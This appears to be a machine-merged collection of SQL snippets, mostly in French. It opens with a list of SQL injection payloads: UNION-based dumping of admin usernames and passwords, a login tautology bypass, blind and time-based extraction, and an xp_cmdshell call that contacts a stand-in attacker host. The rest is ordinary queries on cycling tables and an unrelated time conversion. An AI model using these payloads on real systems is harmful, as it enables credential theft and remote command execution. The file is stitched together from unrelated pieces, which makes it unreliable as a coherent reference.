# SQL Examples Collection

## 1. SQL Injection Payloads

Exemples de requêtes utilisées pour tester et exploiter les vulnérabilités d'injection SQL.

```sql
-- Union-based injection to extract admin credentials
SELECT name, email FROM users WHERE id = 1
UNION
SELECT username, password FROM admins;

-- Bypass authentication via tautology
SELECT * FROM users WHERE username = 'admin' AND '1'='1';

-- Time-based injection to detect blind SQLi
SELECT IF(1=1, SLEEP(5), 0);

-- Error-based injection to execute shell commands (MSSQL)
SELECT * FROM users WHERE id = 1;
EXEC xp_cmdshell('nslookup attacker.com');

-- Comment out the rest of the query
SELECT * FROM users WHERE id = 1; -- 

-- Extract character by character using substring
SELECT * FROM users WHERE username = 'admin'
  AND SUBSTRING(password, 1, 1) = 'a';

-- Generic boolean-based blind injection
1 OR (SELECT SUBSTR(GROUP_CONCAT(username, password), i, 1) FROM users) = CHAR(j);

-- Inline login injection example
login=%bf' OR 1=1 -- -&password=abc

-- Union with group_concat
' UNION SELECT (SELECT GROUP_CONCAT(username, password) FROM users), 2 -- -
```

> **Astuce** : ajustez les fonctions de concaténation (`GROUP_CONCAT`, `STRING_AGG`, etc.) selon votre SGBD.

---

## 2. Requêtes SQL d'exemple

Requêtes non malicieuses illustrant des opérations courantes sur des tables `Pays`, `Cyclistes` ou `Coureurs`.

### Table `Pays`

```sql
-- Sélection de tous les pays
SELECT * FROM Pays;

-- Sélection de l'ID et du nom pour un code CIO précis
SELECT id, nom FROM Pays WHERE code_cio = 'SWZ';

-- Recherche par nom commençant par 'A'
SELECT * FROM Pays WHERE nom LIKE 'A%';

-- Noms de pays de longueur > 10, triés par ordre décroissant
SELECT * FROM Pays
WHERE LENGTH(nom) > 10
ORDER BY nom DESC;

-- Pagination : 12 enregistrements à partir du 181ᵉ
SELECT * FROM Pays LIMIT 12 OFFSET 180;
```

### Table `Cyclistes`

```sql
-- Tous les cyclistes triés par ID
SELECT id, nom, prenom, idEquipe FROM Cyclistes ORDER BY id ASC;

-- Cyclistes de nationalité française
SELECT nom, prenom, idEquipe
FROM Cyclistes
WHERE nationalite = 'Française';
```

### Table `Coureurs`

```sql
-- Cyclistes dans une équipe contenant 'Française'
SELECT id, nom, prenom, equipe
FROM Coureurs
WHERE equipe LIKE '%Française%';

-- Cyclistes non françaises mais dans une équipe française
SELECT nom, prenom, equipe
FROM Coureurs
WHERE nationalite != 'Française'
  AND equipe LIKE '%Française%';

-- Calcul de l'âge en 2012 et sélection des jeunes (<= 22 ans)
SELECT nom, prenom, date_naissance,
       (2012 - STRFTIME('%Y', date_naissance)) AS age_en_2012
FROM Coureurs
WHERE age_en_2012 <= 22;
```

---

## 3. Conversion de temps

Exemple de conversion pour comprendre une injection time-based :

- 4 minutes, 42 secondes, 174 millisecondes = 240 + 42 + 0.174 = **282.174 secondes**

---

*Fichier généré par SQL_Examples Merge Tool.*
